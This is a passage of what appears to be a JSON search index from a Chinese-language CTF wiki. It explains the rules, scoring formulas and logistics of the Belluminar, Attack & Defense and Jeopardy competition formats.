\u8fdb\u5165\u6bd4\u8d5b\u540e\uff0c\u5404\u652f\u961f\u4f0d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u5176\u4ed6\u56e2\u961f\u51fa\u7684\u9898\u76ee\u5e76\u53d1\u8d77\u6311\u6218\uff0c\u4f46\u662f\u4e0d\u80fd\u89e3\u7b54\u672c\u961f\u51fa\u7684\u9898\u76ee\uff0c\u4e0d\u8bbe\u7f6e First Blood \u5956\u52b1\uff0c\u6839\u636e\u89e3\u9898\u79ef\u5206\u8fdb\u884c\u6392\u540d\u3002\u89e3\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 60%\u3002 \u5206\u4eab\u8ba8\u8bba \u00b6 \u6bd4\u8d5b\u7ed3\u675f\u540e\uff0c\u961f\u4f0d\u4f11\u606f\uff0c\u5e76\u51c6\u5907\u5236\u4f5c\u5206\u4eab PPT\uff08\u4e5f\u53ef\u4ee5\u5728\u51fa\u9898\u9636\u6bb5\u51c6\u5907\u597d\uff09\u3002\u5206\u4eab\u4f1a\u65f6\uff0c\u5404\u961f\u6d3e 2 \u540d\u961f\u5458\u4e0a\u53f0\u8fdb\u884c\u51fa\u9898\u89e3\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u8003\u5bdf\u77e5\u8bc6\u70b9\u7b49\u7684\u5206\u4eab\u3002\u5728\u6f14\u793a\u7ed3\u675f\u540e\u8fdb\u5165\u4e92\u52a8\u8ba8\u8bba\u73af\u8282\uff0c\u89e3\u8bf4\u4ee3\u8868\u9700\u8981\u56de\u7b54\u8bc4\u59d4\u548c\u5176\u4ed6\u9009\u624b\u63d0\u51fa\u7684\u95ee\u9898\u3002\u89e3\u8bf4\u6ca1\u6709\u592a\u5927\u7684\u65f6\u95f4\u9650\u5236\uff0c\u4f46\u662f\u65f6\u95f4\u7528\u91cf\u662f\u8bc4\u5206\u7684\u4e00\u4e2a\u6807\u51c6\u3002 \u8ba1\u5206\u89c4\u5219 \u00b6 \u51fa\u9898\u79ef\u5206\uff08\u5360\u603b\u5206 30%\uff09\u6709 50% \u7531\u8bc4\u59d4\u6839\u636e\u9898\u76ee\u63d0\u4ea4\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u5b8c\u6574\u8d28\u91cf\uff0c\u63d0\u4ea4\u65f6\u95f4\u7b49\u8fdb\u8bc4\u5206\uff0c\u53e6\u5916 50% \u5219\u6839\u636e\u6bd4\u8d5b\u7ed3\u675f\u540e\u6700\u7ec8\u89e3\u9898\u60c5\u51b5\u8fdb\u884c\u8bc4\u5206\u3002\u8ba1\u5206\u516c\u5f0f\u793a\u4f8b\uff1aScore = MaxScore -- | N -- Expect\uff3fN |\u3002\u8fd9\u91cc N \u662f\u6307\u89e3\u51fa\u8be5\u9898\u7684\u961f\u4f0d\u6570\u91cf\uff0c\u800c Expect\uff3fN \u5219\u662f\u8fd9\u9053\u9898\u9884\u671f\u5e94\u8be5\u89e3\u51fa\u7684\u9898\u76ee\u6570\u91cf\u3002\u53ea\u6709\u5f53\u9898\u76ee\u96be\u5ea6\u9002\u4e2d\uff0c\u89e3\u9898\u961f\u4f0d\u6570\u91cf\u8d8a\u63a5\u8fd1\u9884\u671f\u6570\u91cf Expect\uff3fN\uff0c\u5219\u8fd9\u9053\u9898\u7684\u51fa\u9898\u961f\u4f0d\u5f97\u5230\u7684\u51fa\u9898\u79ef\u5206\u8d8a\u9ad8\u3002 \u89e3\u9898\u79ef\u5206\uff08\u5360\u603b\u79ef\u5206 60%\uff09\u5728\u8ba1\u7b97\u65f6\u4e0d\u8003\u8651 First Blood \u5956\u52b1\u3002 \u5206\u4eab\u79ef\u5206\uff08\u5360 10%\uff09\u7531\u8bc4\u59d4\u548c\u5176\u4ed6\u961f\u4f0d\u6839\u636e\u5176\u6280\u672f\u5206\u4eab\u5185\u5bb9\u8fdb\u884c\u8bc4\u5206\uff08\u8003\u8651\u5206\u4eab\u65f6\u95f4\u4ee5\u53ca\u5176\u4ed6\u9650\u5236\uff09\uff0c\u8ba1\u7b97\u5e73\u5747\u503c\u5f97\u51fa\u3002 \u8d5b\u5236\u603b\u8bc4 \u00b6 \u8d5b\u5236\u4e2d\u5c06 Challenge \u7684\u51fa\u9898\u65b9\u4ea4\u7531\u53d7\u9080\u6218\u961f\uff0c\u8ba9\u6218\u961f\u80fd\u5c3d\u81ea\u5df1\u6240\u80fd\u4e92\u76f8\u51fa\u9898\uff0c\u6bd4\u8d5b\u96be\u5ea6\u548c\u8303\u56f4\u4e0d\u4f1a\u88ab\u4e3b\u529e\u65b9\u6c34\u5e73\u9650\u5236\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u9ad8 Challenge \u7684\u8d28\u91cf\uff0c\u6bcf\u4e2a\u6218\u961f\u90fd\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u4e0e\u63d0\u5347\u3002\u5728\"\u5206\u4eab\"\u73af\u8282\uff0c\u5bf9\u672c\u961f\u9898\u76ee\u8fdb\u884c\u8bb2\u89e3\u7684\u540c\u65f6\u4e5f\u5728\u6df1\u5316\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\uff0c\u5728\u8ba8\u8bba\u56de\u7b54\u7684\u8fc7\u7a0b\u66f4\u662f\u4e00\u79cd\u601d\u7ef4\u4e92\u52a8\u7684\u73af\u8282\u3002\u5728\u8d5b\u540e\u7684\u5b66\u4e60\u603b\u7ed3\u4e2d\u80fd\u5f97\u5230\u66f4\u597d\u7684\u8ba4\u77e5\u3002 \u653b\u9632\u6a21\u5f0f - Attack & Defense \u00b6 \u653b\u9632\u6a21\u5f0f\u5e38\u89c1\u4e8e\u7ebf\u4e0b\u51b3\u8d5b\u3002\u5728\u653b\u9632\u6a21\u5f0f\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u5728\u7f51\u7edc\u7a7a\u95f4\u4e92\u76f8\u8fdb\u884c\u653b\u51fb\u548c\u9632\u5b88\uff0c\u6316\u6398\u7f51\u7edc\u670d\u52a1\u6f0f\u6d1e\u5e76\u653b\u51fb\u5bf9\u624b\u670d\u52a1\u6765\u5f97\u5206\uff0c\u4fee\u8865\u81ea\u8eab\u670d\u52a1\u6f0f\u6d1e\u8fdb\u884c\u9632\u5fa1\u6765\u5f97\u5206\uff08\u5f53\u7136\u6709\u7684\u6bd4\u8d5b\u5728\u9632\u5fa1\u4e0a\u4e0d\u8bbe\u7f6e\u5f97\u5206\uff0c\u9632\u5fa1\u53ea\u80fd\u907f\u514d\u4e22\u5206\uff09\u3002\u653b\u9632\u6a21\u5f0f CTF \u8d5b\u5236\u53ef\u4ee5\u5b9e\u65f6\u901a\u8fc7\u5f97\u5206\u53cd\u6620\u51fa\u6bd4\u8d5b\u60c5\u51b5\uff0c\u6700\u7ec8\u4e5f\u4ee5\u5f97\u5206\u76f4\u63a5\u5206\u51fa\u80dc\u8d1f\uff0c\u662f\u4e00\u79cd\u7ade\u4e89\u6fc0\u70c8\uff0c\u5177\u6709\u5f88\u5f3a\u89c2\u8d4f\u6027\u548c\u9ad8\u5ea6\u900f\u660e\u6027\u7684\u7f51\u7edc\u5b89\u5168\u8d5b\u5236\u3002\u5728\u8fd9\u79cd\u8d5b\u5236\u4e2d\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u53c2\u8d5b\u961f\u5458\u7684\u667a\u529b\u548c\u6280\u672f\uff0c\u4e5f\u6bd4\u4f53\u529b\uff08\u56e0\u4e3a\u6bd4\u8d5b\u4e00\u822c\u90fd\u4f1a\u6301\u7eed 48 \u5c0f\u65f6\u53ca\u4ee5\u4e0a\uff09\uff0c\u540c\u65f6\u4e5f\u6bd4\u56e2\u961f\u4e4b\u95f4\u7684\u5206\u5de5\u914d\u5408\u4e0e\u5408\u4f5c\u3002 \u63a5\u4e0b\u6765\u8bb2\u8bb2\u653b\u9632\u6a21\u5f0f\u7684\u5177\u4f53\u60c5\u51b5\uff1a \u4e00\u822c\u6bd4\u8d5b\u7684\u5177\u4f53\u73af\u5883\u4f1a\u5728\u5f00\u8d5b\u524d\u7ea6\u534a\u5c0f\u65f6\u7531\u6bd4\u8d5b\u4e3b\u529e\u65b9\u7ed9\u51fa\uff08\u662f\u4e00\u4efd\u51e0\u9875\u7684\u5c0f\u6587\u6863\uff09\u3002\u5728\u8fd9\u534a\u5c0f\u65f6\u5185\uff0c\u4f60\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684\u6587\u6863\u719f\u6089\u73af\u5883\u5e76\u505a\u597d\u9632\u5fa1\u3002 \u9996\u5148\u9700\u8981\u63a5\u5165\u6bd4\u8d5b\u73af\u5883\uff0c\u4e3b\u529e\u65b9\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u4e0e\u7f51\u7ebf\u63a5\u53e3\u8f6c\u6362\u5668\uff08\u6bd4\u5982 Mac \u7535\u8111\u9700\u8981\u4f7f\u7528\uff0c\u5982\u679c\u4e3b\u529e\u65b9\u6ca1\u6709\u63d0\u4f9b\u7684\u8bdd\uff0c\u90a3\u5c31\u9700\u8981\u4f60\u81ea\u5907\u4e86\u3002\u5b58\u5728\u6b64\u95ee\u9898\u7684\u5c0f\u4f19\u4f34\u53ef\u4ee5\u6ce8\u610f\u4e00\u4e0b\uff09\u3002\u6587\u6863\u4e0a\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u8fde\u63a5\u9700\u8981\u586b\u5199\u7684 IP \u5730\u5740\u3001\u7f51\u5173\u3001\u63a9\u7801\u3001DNS \u670d\u52a1\u5668\u5730\u5740 \u7528\u4e8e\u8fde\u63a5\u7f51\u7edc\u3002 \u6587\u6863\u4e0a\u4f1a\u660e\u786e\u7ed9\u51fa \u53c2\u8d5b\u961f\u4f0d\u6240\u5728 IP \u7f51\u6bb5 \u3001 \u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0 \u3001 \u5df1\u65b9 Gamebox \u7684 IP \u5730\u5740 \u3001 \u767b\u5f55\u7528\u6237\u540d\u5bc6\u7801 \u4ee5\u53ca \u654c\u65b9 Gamebox \u6240\u5728 IP \u7f51\u6bb5 \u3002 \u6587\u6863\u4e0a\u4e00\u822c\u90fd\u4f1a\u6709\u6bd4\u8d5b\u73af\u5883\u7684 \u7f51\u7edc\u62d3\u6251\u56fe \uff08\u5982\u4e0b\u56fe\uff09\uff0c\u6bcf\u652f\u961f\u4f0d\u4f1a\u7ef4\u62a4\u82e5\u5e72\u7684 Gamebox\uff08\u5df1\u65b9\u670d\u52a1\u5668\uff09 \uff0cGamebox \u4e0a\u90e8\u7f72\u6709\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\u3002\u53c2\u8d5b\u961f\u4f0d\u4f7f\u7528\u6587\u6863\u63d0\u4f9b\u7684\u7528\u6237\u540d\u5bc6\u7801\u767b\u5f55\u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0\u548c Gamebox\u3002 \u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u534a\u5c0f\u65f6\uff0c\u8fd9\u534a\u5c0f\u65f6\u5185\u662f\u65e0\u6cd5\u8fdb\u884c\u653b\u51fb\u7684\uff0c\u5404\u652f\u961f\u4f0d\u90fd\u4f1a\u52a0\u7d27\u719f\u6089\u6bd4\u8d5b\u7f51\u7edc\u73af\u5883\uff0c\u5e76\u505a\u597d\u9632\u5fa1\u51c6\u5907\u3002\u81f3\u4e8e\u654c\u65b9 Gamebox \u7684 IP \u5730\u5740\uff0c\u5219\u9700\u8981\u9760\u4f60\u81ea\u5df1\u5728\u7ed9\u51fa\u7f51\u6bb5\u4e2d\u53d1\u73b0\u3002 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u822c\u6bcf\u8f6e\u5927\u7ea6\u662f 3 - 5 \u5206\u949f\u65f6\u95f4\u3002\u4f60\u9700\u8981\u5199\u811a\u672c\u81ea\u52a8\u63d0\u4ea4\u5230\u7b54\u9898\u5e73\u53f0\uff08\u624b\u52a8\u63d0\u4ea4\u4e5f\u884c\uff09\u4e0a\u5f97\u5206\u3002\u6bcf\u652f\u961f\u4f0d\u90fd\u4f1a\u6709\u4e00\u5b9a\u7684\u521d\u59cb\u5f97\u5206\uff08\u4e00\u822c\u521d\u59cb\u5f97\u5206\u76f8\u540c\uff0c\u5982\u679c\u8d5b\u524d\u4f1a\u76f8\u5e94\u8003\u6838\uff0c\u90a3\u4e48\u4f1a\u6839\u636e\u8d5b\u524d\u8003\u6838\u6210\u7ee9\u8bbe\u7f6e\u653b\u9632\u8d5b\u7684\u521d\u59cb\u5f97\u5206\uff09Gamebox \u72b6\u6001\u5206\u4e3a\u4e09\u79cd\uff0c \u6b63\u5e38\u3001\u653b\u9677\u3001\u4e0d\u53ef\u7528 \u3002Gamebox \u4e2d\u7684 flag \u4e5f\u4f1a\u6bcf\u8f6e\u8fdb\u884c\u5237\u65b0\u3002 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u6709\u88c1\u5224\u7cfb\u7edf\u6bcf\u8f6e\u90fd\u4f1a\u8fdb\u884c\u8bc4\u5b9a\u3002 \u5982\u679c\u4e00\u8f6e\u8fc7\u53bb\uff0cGamebox \u8868\u73b0\u6b63\u5e38\uff0c\u90a3\u4e48\u88c1\u5224\u7cfb\u7edf\u4f1a\u6839\u636e\u672c\u8f6e\u672a\u88ab\u653b\u9677\u7684 Gamebox \u60c5\u51b5\u7ed9\u4e88\u9632\u5fa1\u5f97\u5206 \u5982\u679c\u9632\u5fa1\u8fc7\u4e8e\u4e25\u683c\uff0c\u65e0\u6cd5\u901a\u8fc7\u88c1\u5224\u7cfb\u7edf\u7684 \u6f0f\u6d1e\u670d\u52a1\u53ef\u7528\u6027\u5224\u5b9a \u7684\u8bdd\uff0c\u8be5\u8f6e\u4f1a\u88ab\u88c1\u5224\u7cfb\u7edf\u8ba4\u5b9a\u4e3a\u8be5 Gamebox \u4e0d\u53ef\u7528\uff08\u89c6\u4e3a\u5b95\u673a\uff09\u3002\u672c\u8f6e\u76f4\u63a5\u5931\u5206\u3002 \u5982\u679c Gamebox \u88ab\u653b\u9677\uff08\u6709\u961f\u4f0d\u63d0\u4ea4\u4e86\u4f60\u4eec\u961f Gamebox \u4e0a\u968f\u673a\u751f\u6210\u7684 flag\uff09\uff0c\u90a3\u4e48\u88c1\u5224\u7cfb\u7edf\u4f1a\u7ed9\u4e88\u8be5\u961f\u653b\u51fb\u5f97\u5206\u3002 \u4e00\u8f6e\u4e0b\u6765\uff0c\u7531\u6210\u529f\u653b\u9677\u8be5 Gamebox \u7684\u961f\u4f0d\u5e73\u5206\u653b\u9677\u5f97\u5206\u3002 \u5982\u679c\u662f\u5206\u4e3a\u4e0a\u5348\u4e0b\u5348\u4e24\u573a\u653b\u9632\u8d5b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e0a\u5348\u548c\u4e0b\u5348\u7684 Gamebox \u6f0f\u6d1e\u670d\u52a1\u4f1a\u66f4\u6362\uff08\u907f\u514d\u6bd4\u8d5b\u4e2d\u9014\u4f11\u606f\u65f6\u9009\u624b\u4ea4\u6d41\uff09\uff0c\u4f46\u7ba1\u7406\u65f6\u8981\u7528\u7684 IP \u5730\u5740\u4ec0\u4e48\u7684\u4e0d\u4f1a\u6539\u53d8\u3002\u4e5f\u5c31\u662f \u4e0b\u5348\u4f1a\u6362\u65b0\u9898 \u3002","title":"CTF \u7ade\u8d5b\u6a21\u5f0f\u7b80\u4ecb"},{"location":"introduction/mode/#-jeopardy","text":"\u89e3\u9898\u6a21\u5f0f\uff08Jeopardy\uff09\u5e38\u89c1\u4e8e\u7ebf\u4e0a\u9009\u62d4\u6bd4\u8d5b\u3002\u5728\u89e3\u9898\u6a21\u5f0f CTF \u8d5b\u5236\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u6216\u8005\u73b0\u573a\u7f51\u7edc\u53c2\u4e0e\uff0c\u53c2\u6570\u961f\u4f0d\u901a\u8fc7\u4e0e\u5728\u7ebf\u73af\u5883\u4ea4\u4e92\u6216\u6587\u4ef6\u79bb\u7ebf\u5206\u6790\uff0c\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6311\u6218\u83b7\u53d6\u76f8\u5e94\u5206\u503c\uff0c\u4e0e ACM \u7f16\u7a0b\u7ade\u8d5b\u3001\u4fe1\u606f\u5b66\u5965\u8d5b\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u6839\u636e\u603b\u5206\u548c\u65f6\u95f4\u6765\u6392\u540d\u3002 \u76f8\u4e0d\u540c\u7684\u662f\u89e3\u9898\u6a21\u5f0f\u4e00\u822c\u4f1a\u8bbe\u7f6e \u4e00\u8840 \u3001 \u4e8c\u8840 \u3001 \u4e09\u8840 \uff0c\u4e5f\u5373\u6700\u5148\u5b8c\u6210\u7684\u524d\u4e09\u652f\u961f\u4f0d\u4f1a\u83b7\u5f97\u989d\u5916\u5206\u503c\uff0c\u6240\u4ee5\u8fd9\u4e0d\u4ec5\u662f\u5bf9\u9996\u5148\u89e3\u51fa\u9898\u76ee\u7684\u961f\u4f0d\u7684\u5206\u503c\u9f13\u52b1\uff0c\u4e5f\u662f\u4e00\u79cd\u56e2\u961f\u80fd\u529b\u7684\u95f4\u63a5\u4f53\u73b0\u3002 \u5f53\u7136\u8fd8\u6709\u4e00\u79cd\u6d41\u884c\u7684\u8ba1\u5206\u89c4\u5219\u662f\u8bbe\u7f6e\u6bcf\u9053\u9898\u76ee\u7684\u521d\u59cb\u5206\u6570\u540e\uff0c\u6839\u636e\u8be5\u9898\u7684\u6210\u529f\u89e3\u7b54\u961f\u4f0d\u6570\uff0c\u6765\u9010\u6e10\u964d\u4f4e\u8be5\u9898\u7684\u5206\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u89e3\u7b54\u8fd9\u9053\u9898\u7684\u4eba\u6570\u8d8a\u591a\uff0c\u90a3\u4e48\u8fd9\u9053\u9898\u7684\u5206\u503c\u5c31\u8d8a\u4f4e\u3002\u6700\u540e\u4f1a\u4e0b\u964d\u5230\u4e00\u4e2a\u4fdd\u5e95\u5206\u503c\u540e\u4fbf\u4e0d\u518d\u4e0b\u964d\u3002 \u9898\u76ee\u7c7b\u578b\u4e3b\u8981\u5305\u542b Web \u7f51\u7edc\u653b\u9632 \u3001 RE \u9006\u5411\u5de5\u7a0b \u3001 Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 \u3001 Crypto \u5bc6\u7801\u653b\u51fb \u3001 Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u8fd9\u516d\u4e2a\u7c7b\u522b\u3002","title":"\u89e3\u9898\u6a21\u5f0f - Jeopardy"},{"location":"introduction/mode/#-belluminar","text":"\u5728 2016 \u5e74\u4e16\u754c\u9ed1\u5ba2\u5927\u5e08\u6311\u6218\u8d5b\uff08WCTF\uff09\u56fd\u5185\u9996\u6b21\u5f15\u5165\u97e9\u56fd POC SECURITY \u56e2\u961f\u5f00\u521b\u7684 BELLUMINAR CTF \uff08\u6218\u4e89\u4e0e\u5206\u4eab\uff09\u8d5b\u5236\uff0c\u4ece\u6b64\u56fd\u5185\u9646\u9646\u7eed\u7eed\u4e5f\u6709\u5f00\u59cb BELLUMINAR \u6a21\u5f0f\u7684\u6bd4\u8d5b\uff0c\u76ee\u524d\u91c7\u53d6\u8fd9\u4e00\u8d5b\u5236\u7684\u6709 2016 \u5e74\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u96c6\u5408\u7684 XMan \u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u4ee5\u53ca\u540c\u5e74 9 \u6708\u7684\u300c\u767e\u5ea6\u676f\u300dCTF \u6bd4\u8d5b\u3002 \u540c\u65f6\u8fd9\u91cc\u4e5f\u6709 BELLUMINAR \u8d5b\u5236\u7684\u4ecb\u7ecd\u5b98\u7f51\uff1a http://belluminar.org/","title":"\u6218\u4e89\u5206\u4eab\u6a21\u5f0f - Belluminar"},{"location":"introduction/mode/#_1","text":"Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of festival consisted of CTF & seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can defend what others want to attack. \u5982\u5b98\u7f51\u4ecb\u7ecd\u8fd9\u6837\uff0cBELLUMINAR CTF \u8d5b\u5236\u7531\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u76f8\u4e92\u51fa\u9898\u6311\u6218\uff0c\u5e76\u5728\u6bd4\u8d5b\u7ed3\u675f\u540e\u8fdb\u884c\u8d5b\u9898\u7684\u51fa\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u601d\u8def\u7b49\u8fdb\u884c\u5206\u4eab\u3002\u6218\u961f\u8bc4\u5206\u4f9d\u636e\u51fa\u9898\u5f97\u5206\uff0c\u89e3\u9898\u5f97\u5206\u548c\u5206\u4eab\u5f97\u5206\u8fdb\u884c\u7efc\u5408\u8bc4\u4ef7\u5e76\u5f97\u51fa\u6700\u7ec8\u7684\u6392\u540d\u3002","title":"\u8d5b\u5236\u4ecb\u7ecd"},{"location":"introduction/mode/#_2","text":"Each team is required to submit 2 challenges to the challenge bank of the sponsor. \u9996\u5148\u5404\u4e2a\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u90fd\u5fc5\u987b\u5728\u6b63\u5f0f\u6bd4\u8d5b\u524d\u51fa\u9898\uff0c\u9898\u91cf\u4e3a 2 \u9053\u3002\u53c2\u8d5b\u961f\u4f0d\u5c06\u6709 12 \u5468\u7684\u65f6\u95f4\u51c6\u5907\u9898\u76ee\u3002\u51fa\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 30%\u3002 Challenge 1: must be on the Linux platform; Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...) \u4f20\u7edf\u7684 BELLUMINAR \u8d5b\u5236\u8981\u6c42\u51fa\u7684\u4e24\u9053\u9898\u4e2d\u4e00\u9053 Challenge \u5fc5\u987b\u662f\u5728 Linux \u5e73\u53f0\uff0c\u53e6\u5916\u4e00\u4e2a\u5219\u4e3a\u975e Linux \u5e73\u53f0\u7684 Challenge\u3002\u4e24\u4e2a Challenge \u7684\u7c7b\u578b\u5219\u6ca1\u6709\u505a\u51fa\u9650\u5236\u3002\u56e0\u6b64\u961f\u4f0d\u53ef\u4ee5\u5c3d\u60c5\u5c55\u73b0\u81ea\u5df1\u7684\u6280\u672f\u6c34\u5e73\u3002 \u4e3a\u4f7f\u6bd4\u8d5b\u9898\u76ee\u7c7b\u578b\u6bd4\u8f83\u5747\u8861\uff0c\u4e5f\u6709\u91c7\u7528\u961f\u4f0d\u62bd\u7b7e\u51fa\u9898\u7684\u65b9\u5f0f\u62bd\u53d6\u81ea\u5df1\u7684\u9898\uff0c\u8fd9\u8981\u6c42\u961f\u4f0d\u80fd\u529b\u6c34\u5e73\u66f4\u4e3a\u5168\u9762\uff0c\u56e0\u6b64\u4e3a\u4e86\u4e0d\u5931\u5e73\u8861\u6027\uff0c\u4e5f\u4f1a\u5c06\u4e24\u9053 Challenge \u7684\u8ba1\u5165\u4e0d\u540c\u5206\u503c\uff08\u6bd4\u5982\u8981\u6c42\u5176\u4e2d\u4e00\u9053 Challenge \u5206\u503c\u4e3a 200\uff0c\u800c\u53e6\u5916\u4e00\u9053\u5206\u503c\u5219\u4e3a 100\uff09\u3002","title":"\u51fa\u9898\u9636\u6bb5"},{"location":"introduction/mode/#_3","text":"\u9898\u76ee\u63d0\u4ea4\u622a\u6b62\u4e4b\u524d\uff0c\u5404\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u4ea4\u5b8c\u6574\u7684\u51fa\u9898\u6587\u6863\u4ee5\u53ca\u89e3\u9898 Writeup\uff0c\u8981\u6c42\u51fa\u9898\u6587\u6863\u4e2d\u8be6\u7ec6\u6807\u660e\u9898\u76ee\u5206\u503c\uff0c\u9898\u9762\uff0c\u51fa\u9898\u8d1f\u8d23\u4eba\uff0c\u8003\u5bdf\u77e5\u8bc6\u70b9\u5217\u8868\u4ee5\u53ca\u9898\u76ee\u6e90\u7801\u3002\u800c\u89e3\u9898 Writeup \u4e2d\u5219\u9700\u8981\u5305\u542b\u64cd\u4f5c\u73af\u5883\uff0c\u5b8c\u6574\u89e3\u9898\u8fc7\u7a0b\uff0c\u89e3\u9898\u4ee3\u7801\u3002 \u9898\u76ee\u63d0\u4ea4\u4e4b\u540e\u4e3b\u529e\u65b9\u4f1a\u5bf9\u9898\u76ee\u548c\u89e3\u9898\u4ee3\u7801\u8fdb\u884c\u6d4b\u8bd5\uff0c\u671f\u95f4\u51fa\u73b0\u95ee\u9898\u5219\u9700\u8981\u8be5\u9898\u8d1f\u8d23\u4eba\u914d\u5408\u89e3\u51b3\u3002\u6700\u7ec8\u90e8\u7f72\u5230\u6bd4\u8d5b\u5e73\u53f0\u4e0a\u3002","title":"\u63d0\u4ea4\u90e8\u7f72"},{"location":"introduction/mode/#_4","text":"\u8fdb\u5165\u6bd4\u8d5b\u540e\uff0c\u5404\u652f\u961f\u4f0d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u5176\u4ed6\u56e2\u961f\u51fa\u7684\u9898\u76ee\u5e76\u53d1\u8d77\u6311\u6218\uff0c\u4f46\u662f\u4e0d\u80fd\u89e3\u7b54\u672c\u961f\u51fa\u7684\u9898\u76ee\uff0c\u4e0d\u8bbe\u7f6e First Blood \u5956\u52b1\uff0c\u6839\u636e\u89e3\u9898\u79ef\u5206\u8fdb\u884c\u6392\u540d\u3002\u89e3\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 60%\u3002","title":"\u89e3\u9898\u7ade\u6280"},{"location":"introduction/mode/#_5","text":"\u6bd4\u8d5b\u7ed3\u675f\u540e\uff0c\u961f\u4f0d\u4f11\u606f\uff0c\u5e76\u51c6\u5907\u5236\u4f5c\u5206\u4eab PPT\uff08\u4e5f\u53ef\u4ee5\u5728\u51fa\u9898\u9636\u6bb5\u51c6\u5907\u597d\uff09\u3002\u5206\u4eab\u4f1a\u65f6\uff0c\u5404\u961f\u6d3e 2 \u540d\u961f\u5458\u4e0a\u53f0\u8fdb\u884c\u51fa\u9898\u89e3\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u8003\u5bdf\u77e5\u8bc6\u70b9\u7b49\u7684\u5206\u4eab\u3002\u5728\u6f14\u793a\u7ed3\u675f\u540e\u8fdb\u5165\u4e92\u52a8\u8ba8\u8bba\u73af\u8282\uff0c\u89e3\u8bf4\u4ee3\u8868\u9700\u8981\u56de\u7b54\u8bc4\u59d4\u548c\u5176\u4ed6\u9009\u624b\u63d0\u51fa\u7684\u95ee\u9898\u3002\u89e3\u8bf4\u6ca1\u6709\u592a\u5927\u7684\u65f6\u95f4\u9650\u5236\uff0c\u4f46\u662f\u65f6\u95f4\u7528\u91cf\u662f\u8bc4\u5206\u7684\u4e00\u4e2a\u6807\u51c6\u3002","title":"\u5206\u4eab\u8ba8\u8bba"},{"location":"introduction/mode/#_6","text":"\u51fa\u9898\u79ef\u5206\uff08\u5360\u603b\u5206 30%\uff09\u6709 50% \u7531\u8bc4\u59d4\u6839\u636e\u9898\u76ee\u63d0\u4ea4\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u5b8c\u6574\u8d28\u91cf\uff0c\u63d0\u4ea4\u65f6\u95f4\u7b49\u8fdb\u8bc4\u5206\uff0c\u53e6\u5916 50% \u5219\u6839\u636e\u6bd4\u8d5b\u7ed3\u675f\u540e\u6700\u7ec8\u89e3\u9898\u60c5\u51b5\u8fdb\u884c\u8bc4\u5206\u3002\u8ba1\u5206\u516c\u5f0f\u793a\u4f8b\uff1aScore = MaxScore -- | N -- Expect\uff3fN |\u3002\u8fd9\u91cc N \u662f\u6307\u89e3\u51fa\u8be5\u9898\u7684\u961f\u4f0d\u6570\u91cf\uff0c\u800c Expect\uff3fN \u5219\u662f\u8fd9\u9053\u9898\u9884\u671f\u5e94\u8be5\u89e3\u51fa\u7684\u9898\u76ee\u6570\u91cf\u3002\u53ea\u6709\u5f53\u9898\u76ee\u96be\u5ea6\u9002\u4e2d\uff0c\u89e3\u9898\u961f\u4f0d\u6570\u91cf\u8d8a\u63a5\u8fd1\u9884\u671f\u6570\u91cf Expect\uff3fN\uff0c\u5219\u8fd9\u9053\u9898\u7684\u51fa\u9898\u961f\u4f0d\u5f97\u5230\u7684\u51fa\u9898\u79ef\u5206\u8d8a\u9ad8\u3002 \u89e3\u9898\u79ef\u5206\uff08\u5360\u603b\u79ef\u5206 60%\uff09\u5728\u8ba1\u7b97\u65f6\u4e0d\u8003\u8651 First Blood \u5956\u52b1\u3002 \u5206\u4eab\u79ef\u5206\uff08\u5360 10%\uff09\u7531\u8bc4\u59d4\u548c\u5176\u4ed6\u961f\u4f0d\u6839\u636e\u5176\u6280\u672f\u5206\u4eab\u5185\u5bb9\u8fdb\u884c\u8bc4\u5206\uff08\u8003\u8651\u5206\u4eab\u65f6\u95f4\u4ee5\u53ca\u5176\u4ed6\u9650\u5236\uff09\uff0c\u8ba1\u7b97\u5e73\u5747\u503c\u5f97\u51fa\u3002","title":"\u8ba1\u5206\u89c4\u5219"},{"location":"introduction/mode/#_7","text":"\u8d5b\u5236\u4e2d\u5c06 Challenge 